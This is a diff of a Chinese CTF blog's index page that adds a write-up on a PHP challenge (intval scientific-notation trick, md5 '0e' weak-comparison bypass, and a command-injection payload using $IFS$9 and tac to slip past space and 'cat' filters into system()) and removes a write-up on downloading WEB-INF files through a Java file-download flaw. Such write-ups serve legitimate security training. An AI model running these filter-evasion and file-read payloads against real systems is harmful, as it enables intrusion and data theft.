@@ -113,7 +113,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 12.86px;">java</a> <a href="/tags/misc/" style="font-size: 11.43px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
+						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 12.86px;">java</a> <a href="/tags/misc/" style="font-size: 11.43px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 10px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -168,6 +168,92 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-robots文件及inval函数和mad5绕过" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/05/robots%E6%96%87%E4%BB%B6%E5%8F%8Ainval%E5%87%BD%E6%95%B0%E5%92%8Cmad5%E7%BB%95%E8%BF%87/" class="article-date">
+  	<time datetime="2021-09-04T16:00:00.000Z" itemprop="datePublished">2021-09-05</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/05/robots%E6%96%87%E4%BB%B6%E5%8F%8Ainval%E5%87%BD%E6%95%B0%E5%92%8Cmad5%E7%BB%95%E8%BF%87/">
+        robots.txt文件及inval函数和md5绕过
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="robots文件及inval函数和md5绕过"><a href="#robots文件及inval函数和md5绕过" class="headerlink" title="robots文件及inval函数和md5绕过"></a>robots文件及inval函数和md5绕过</h1><p>打开页面，发现有bot文字出现，所以我们可以考虑是robots.txt文件，即访问限制的文件，构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/robots.txt</span><br></pre></td></tr></table></figure>
+<p>我们可以看见</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent：*</span><br><span class="line">Disallow：/fAke_flagggg.php</span><br></pre></td></tr></table></figure>
+
+<p>因此，我们访问/fAke_flagggg.php文件，发现flag{this_is_not_flag}，然后我们刷新再抓包，发现回显的包中有一个提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Look_at_me：fl4g.php</span><br></pre></td></tr></table></figure>
+
+<p>然后去访问/fl4g.php文件，发现有源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;Content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//level 1</span><br><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;</span><br><span class="line">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">//level 2</span><br><span class="line">if (isset($_GET[&#x27;md5&#x27;]))&#123;</span><br><span class="line">   $md5=$_GET[&#x27;md5&#x27;];</span><br><span class="line">   if ($md5==md5($md5))</span><br><span class="line">       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;</span><br><span class="line">   else</span><br><span class="line">       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//get flag</span><br><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br><span class="line">        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;快到非洲了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>发现有三层的过滤</p>
+<p>第一层过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(intval($num)&lt;2020 &amp;&amp; intval($num+1)&gt;2021)&#123;</span><br><span class="line"></span><br><span class="line">	echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中intval()函数为获取变量的整数值，所以intval()函数的参数如果输入科学计数法的字符串的话，会以e前面的数字返回值，而对于科学计数法+数字的话，会返回字符串类型，本地调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$num=3e3;</span><br><span class="line">echo(intval($num));</span><br><span class="line">echo(&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">echo(intval($num+1);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这样就可以绕过这层过滤</p>
+<p>第二层过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($md5==md5($md5))&#123;</span><br><span class="line">	echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以利用php弱类型进行绕过，就是当用==对两个md5的值进行比较时，如果md5的值的前两位为0e时，hash值会为0，致使两个不同的md5值相同，不过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e后面的必须是数字</span><br></pre></td></tr></table></figure>
+<p>所以我们可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br></pre></td></tr></table></figure>
+<p>来进行绕过，然后写了一个简陋的exp来获取可以使用的数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">for($k=0;$k&lt;=1000000000;$k++)&#123;</span><br><span class="line">	$i=&quot;0e&quot;.$k;</span><br><span class="line">	$j=substr(md5($i),0,2);</span><br><span class="line">	if($j==&quot;0e&quot;)&#123;</span><br><span class="line">		for($h=2;$h&lt;strlen(md5($i));$h++)&#123;</span><br><span class="line">			if(substr(md5($i),$h,1)&lt;&#x27;0&#x27; || substr(md5($i),$h,1)&gt;&#x27;9&#x27;)&#123;</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	echo $h;      </span><br><span class="line">	if($h==strlen(md5($i)))&#123;</span><br><span class="line">		echo &quot;0e&quot;.$k;</span><br><span class="line">	&#125;</span><br><span class="line">	echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>第三层过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br></pre></td></tr></table></figure>
+<p>这里过滤了空格和cat，所以，我们可以用$IFS$9来代替空格，而tac来代替cat，所以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=2e5&amp;md5=0e215962017&amp;get_flag=tac$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-unicode编码安全问题" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -1172,86 +1258,6 @@ while count==1:
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-java的WEB-INF" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/08/30/java%E7%9A%84WEB-INF/" class="article-date">
-  	<time datetime="2021-08-29T16:00:00.000Z" itemprop="datePublished">2021-08-30</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/30/java%E7%9A%84WEB-INF/">
-        java的WEB-INF
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="java的WEB-INF文件"><a href="#java的WEB-INF文件" class="headerlink" title="java的WEB-INF文件"></a>java的WEB-INF文件</h1><p>我们点击help，出现</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br></pre></td></tr></table></figure>
-<p>而且payload为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/Download?filename=文件名</span><br></pre></td></tr></table></figure>
-<p>可见可能是文件包含，可以用此下载文件，不过用get提交的方式不可以，所以此处我们可以试一下post提交，发现可以下载help.docx文件，而且用bp抓包，放到repeater后改为post提交，可以看见500状态码，即服务器内部出错，并爆出一些关键信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 500 – Internal Server Error&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;h1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;&#125; h2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; h3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; body &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; b &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; p &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125; a &#123;color:black;&#125; a.name &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 500 – Internal Server Error&lt;/h1&gt;&lt;hr class=&quot;line&quot; /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server encountered an unexpected condition that prevented it from fulfilling the request.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Exception&lt;/b&gt;&lt;/p&gt;&lt;pre&gt;java.lang.NullPointerException</span><br><span class="line">	java.io.FileInputStream.&amp;lt;init&amp;gt;(FileInputStream.java:130)</span><br><span class="line">	java.io.FileInputStream.&amp;lt;init&amp;gt;(FileInputStream.java:93)</span><br><span class="line">	com.wm.ctf.DownloadController.doPost(DownloadController.java:24)</span><br><span class="line">	javax.servlet.http.HttpServlet.service(HttpServlet.java:661)</span><br><span class="line">	javax.servlet.http.HttpServlet.service(HttpServlet.java:742)</span><br><span class="line">	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)</span><br><span class="line">&lt;/pre&gt;&lt;p&gt;&lt;b&gt;Note&lt;/b&gt; The full stack trace of the root cause is available in the server logs.&lt;/p&gt;&lt;hr class=&quot;line&quot; /&gt;&lt;h3&gt;Apache Tomcat/8.5.24&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>其中我们可以看见</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.wm.ctf.DownloadController.doPost(DownloadController.java:24)</span><br></pre></td></tr></table></figure>
-<p>而一般我们出于安全的考虑，我们会将网页放在WEB-INF文件下，防止页面被直接访问，而要访问WEB-INF文件下的网页，在WEB-INF文件下设置web.xml文件，其中web.xml的格式为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--直接设置 welcome-file 节点--&gt;</span><br><span class="line">&lt;welcome-file&gt; ./WEB-INF/views/xxx.jsp&lt;/weclome-file&gt;</span><br></pre></td></tr></table></figure>
-<p>访问地址为：<a target="_blank" rel="noopener" href="http://url/xxx/%EF%BC%88xxx%E4%B8%BA%E9%A1%B9%E7%9B%AE%E5%90%8D%EF%BC%89">http://url/xxx/（xxx为项目名）</a></p>
-<p>因此，我们可以包含web.xml文件，即将help.docx改为web.xml进行post提交即可下载web.xml</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot; version=&quot;4.0&quot;&gt;</span><br><span class="line">&lt;welcome-file-list&gt;</span><br><span class="line">&lt;welcome-file&gt;Index&lt;/welcome-file&gt;</span><br><span class="line">&lt;/welcome-file-list&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.IndexController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Index&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.LoginController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Login&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.DownloadController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Download&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
-<p>通过看</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br></pre></td></tr></table></figure>
-<p>可知FlagController.class文件放在WEB-INF/classes/com/wm/ctf/中</p>
-<p>WEB-INF主要包含的文件和目录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>
-
-<p>所以可以和上面一样，包含FlagController.class文件，因此构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure>
-<p>即可得到，里面的base64的码就是flag</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li></ul>
 	</div>
 
       
